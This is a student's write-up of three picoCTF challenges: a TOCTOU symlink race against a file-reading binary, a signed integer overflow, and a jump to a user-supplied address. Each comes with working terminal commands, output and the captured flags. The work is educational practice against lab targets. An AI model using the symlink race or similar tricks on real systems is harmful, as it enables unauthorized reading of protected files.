## 1. tic-tac 

### **Flag-**       
picoCTF{ToctoU_!s_3a5y_0490d70a}

### **Thought Process-**        
> Here when I got connected there were 3 files(Flag,source file and executable binary file). With the help source file(src.cpp) it became clear that the binary file > was just checking the permissions and ownership of files and then performing the tasks as per instructions. My tires-
>
> 1. I tired `chmod` to change file permissions but I couldn't.
> 2. I also tried running `sudo` to read the flag but it didn't work.
> 3. I tried changing the `src.cpp` file to see if somehow this and binary file are connected and may affect it's functionality but it didn't go as thought.
> 4. Then I tried to copy flag file contents to another file then print the other file.
> 5. Then I remembered that I forgot to compile the `src.cpp` file before running so I had to again perform the required modifications in `src.cpp` and then I > compiled it but even after running it, it did not work so I understood this will not affect the output.
> 6. So now I read the challenge description again and tried to re-interpret it. It gave me the ida that maybe I can create a program which uses `root` to read the content of `flag.txt` but I was again uunable to do so.
> 7. Thereafter I opened the `src.cpp` file and started observing and searching for vulnerabilities in it as it was the souce code of the binary file. Then I came across `TOCTOU` and came to know that this should work as this was there in challenge description(the word which I was not able to understand back then). For this I tried several ways.
> 8. First of all I created a continuos link chain `flag.txt -> link1 -> link2 -> link3 -> link4 -> link5 -> link6` and tried `./txtreader link6` but his didn't work.
> 9. then I tried link the file and run `txtreader` a number of times in a loop like parallel execution `for i in {1..500}; do ln -sf flag.txt link6 & ./txtreader link6 & done`.
> 10. I also tried it with controlled timing `for i in {1..500}; do ln -sf flag.txt link6 sleep 0.001 ./txtreader link6 done`.
> 11. Sequential way - `for i in {1..500}; do ln -sf flag.txt link6 ./txtreader link6 done`
> 12. The the I remembered that in this way the link pointing to the file is not being able to change in the correct timing so the last try I had was to run a continuos linking in the background and I made this better by creating a loop which continuous changes the link(pointer) to a file written by me which has all the permissions and the flag file so it was now running continuosly in the background so now I ran a loop for `./txtreader link` for 500 times hoping there will be a case in which there is correct timing and ot worked I got the flag.

### **The successful attempt-**    
``` bash
ctf-player@pico-chall$ echo "WHY" > hello.txt
ctf-player@pico-chall$ ./txtreader hello.txt
WHY
ctf-player@pico-chall$ while true
> do
>     ln -sf flag.txt link
>     ln -sf hello.txt link
> done
^C
^C
ctf-player@pico-chall$
ctf-player@pico-chall$ nano try.sh
ctf-player@pico-chall$ chmod +x try.sh
ctf-player@pico-chall$ ./try.sh &
[1] 8168
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
WHY
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
WHY
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
WHY
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link done
> ^C
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link ;done
-bash: syntax error near unexpected token `done'
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link; done
-bash: syntax error near unexpected token `done'
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link; done
-bash: syntax error near unexpected token `done'
ctf-player@pico-chall$ for i in {1..500}; do ./txtreader link; done
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_0490d70a}
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
picoCTF{ToctoU_!s_3a5y_0490d70a}
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_0490d70a}
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
ctf-player@pico-chall$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```


## 2.   two-sum

### **Flag-**         
 picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_ccd078bd}

 ### **Thought Process-**          
> First I went through the program  understood the program then I tried finding the numbers but I was not able to get any because the condition required were only not possible then with the help of the hint `Not necessarily a math problem` I realized that it might have to do something the with the overflows due to enter value more than `int` can store but it still did not print the flag beacuse the value which were working in the program were neative and to print the flag the value being computed by the flag had to positive so I tried using a negative sign and it worked.

### **Working-**
```bash
pratham@:~$ nc saturn.picoctf.net 57945
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
20000000000000
50000000000000
You entered -1662697472 and -2009260032
You have an integer overflow
^C
pratham@:~$ nc saturn.picoctf.net 57945
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
10000000
50000000
You entered 10000000 and 50000000
No overflow
^C
pratham@:~$ nc saturn.picoctf.net 57945
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
90000000
80000000
You entered 90000000 and 80000000
No overflow
^C
pratham@:~$ nc saturn.picoctf.net 57945
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
3000000000
3000000000
You entered -1294967296 and -1294967296
You have an integer overflow
^F^C
pratham@:~$ nc saturn.picoctf.net 57945
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
-3000000000
-3000000000
You entered 1294967296 and 1294967296
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_ccd078bd}
```

## 3. Picker IV 

### **Flag-**        
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}

### **Thought Process-**             
> After seeing the source code I thought that I had to just overflow by entering a out of bound number and it will print the flag but it was not working then I went through the hint then I realised that I will have to find the location of `win()` so I did it using command `nm -C picker-IV | grep win` on the binary executable file.

### **Output-**              
```bash
pratham:~$ nc saturn.picoctf.net 52015
Enter the address in hex to jump to, excluding '0x': 5000000000
You input 0x0
Segfault triggered! Exiting.
^C
pratham:~$ nc saturn.picoctf.net 52015
Enter the address in hex to jump to, excluding '0x': 0026F62
You input 0x26f62
Segfault triggered! Exiting.
^C
pratham:~$ nc saturn.picoctf.net 52015
Enter the address in hex to jump to, excluding '0x': 1
You input 0x1
Segfault triggered! Exiting.
^C
pratham:~$ nc saturn.picoctf.net 52015
Enter the address in hex to jump to, excluding '0x': 066
You input 0x66
Segfault triggered! Exiting.
^C
pratham:~$ ls
_flag.png.extracted                   flag.png                  link       picker-IV:Zone.Identifier
_freakada_3301_message.png.extracted  flag.png:Zone.Identifier  nite       snap
cryptonite_taskphase_pratham          handout                   picker-IV
pratham@LAPTOP-SDGL4LEJ:~$ exiftool picker-IV
ExifTool Version Number         : 12.40
File Name                       : picker-IV
Directory                       : .
File Size                       : 17 KiB
File Modification Date/Time     : 2025:01:04 11:31:21+05:30
File Access Date/Time           : 2025:01:04 11:34:47+05:30
File Inode Change Date/Time     : 2025:01:04 11:34:47+05:30
File Permissions                : -rw-r--r--
File Type                       : ELF executable
File Type Extension             :
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
pratham:~$ nc saturn.picoctf.net 52015
Enter the address in hex to jump to, excluding '0x': 928768398749868298672856432829
You input 0xffffffff
Segfault triggered! Exiting.
^C
pratham:~$ ls
_flag.png.extracted                   flag.png                  link       picker-IV:Zone.Identifier
_freakada_3301_message.png.extracted  flag.png:Zone.Identifier  nite       snap
cryptonite_taskphase_pratham          handout                   picker-IV
pratham:~$ nm -C picker-IV | grep win
000000000040129e T win
pratham:~$ nc saturn.picoctf.net 52015
pratham:~$ nc saturn.picoctf.net 52015
pratham:~$ nc saturn.picoctf.net 58396
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}

```
